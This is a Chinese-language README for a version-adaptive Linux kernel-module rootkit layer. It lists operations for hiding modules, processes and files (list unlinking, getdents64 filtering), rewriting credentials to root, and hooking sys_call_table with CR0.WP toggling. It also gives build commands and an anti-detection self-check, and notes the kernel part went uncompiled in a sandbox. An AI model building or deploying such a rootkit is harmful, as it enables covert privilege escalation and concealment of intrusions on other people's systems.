# 23_lkm — 内核态操作核心（版本自适应）

## 本层解决什么

LKM 跨内核版本工作时，真正的难点不是 hook 本身，而是**结构体字段偏移会变**。
编译期写死的偏移在目标机上不会"失败"，它会静默写进另一个字段——
这是最难排查的一类故障。

因此本层不定义任何内核结构体、不使用任何内核头文件，
把所有操作表达为"给定偏移的裸内存读改"，经 `lkm_mem` 回调完成：

| 宿主 | rd/wr 回调实现 |
|---|---|
| LKM 内 | 直接 `memcpy` 内核虚拟地址 |
| 用户态测试 | 打到普通缓冲区（可逐字节断言） |
| 22_kern | `/proc/kcore`（只读） |

同一段核心代码在三种环境下跑的是同一份实现。

## 四个操作

1. `lkm_unlink_node` — 循环双向链表摘除（模块隐藏 / 进程隐藏的基础）
2. `lkm_dirent_filter` — getdents64 结果就地过滤（文件与进程隐藏）
3. `lkm_cred_apply` — cred 改写为 root 全集（提权）
4. `lkm_hook_install/restore` — sys_call_table 装卸

## 硬规则（违反即拒绝，不做降级）

- **互指校验**：链表摘除前校验 `next->prev`、`prev->next` 都指向自己，
  任一不符返回 `CORRUPT` 且**一个字节都不写**。
- **不猜测偏移**：cred 操作只接受 `probed == 1` 的运行时探测布局，
  否则返回 `LAYOUT`。偏移撞上 `usage`（引用计数）时同样拒绝。
- **不覆盖第三方**：hook 恢复时若槽位已不是我们的地址，返回 `FOREIGN` 并放弃。
- **畸形即放弃**：dirent 缓冲区 `reclen` 异常时返回 `CORRUPT` 且不动缓冲区。
  宁可让调用方拿到原始列表，也不写出让 `ls` 死循环或崩溃的缓冲区。

## 构建与验证

```sh
make test      # 62/62，零警告
make inspect   # 反检测自查
```

末段集成用例读真实 `/proc/kallsyms` 与 `/proc/kcore`；无权限时记 SKIP，不造假。

## LKM 本体

`src/lkm_mod.c` + `Kbuild` 是内核侧绑定，需目标机内核头文件：

```sh
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
```

**该文件在本沙盒内未编译**——环境没有内核头文件（`/lib/modules` 不存在、
apt 全源 403、kernel.org 403）。它只做四件内核特有的事：
符号解析、CR0.WP 开关、内核地址读写回调、与用户态缓冲区搬运。
全部策略逻辑仍在 `src/lkm.c`，已被用户态测试覆盖。
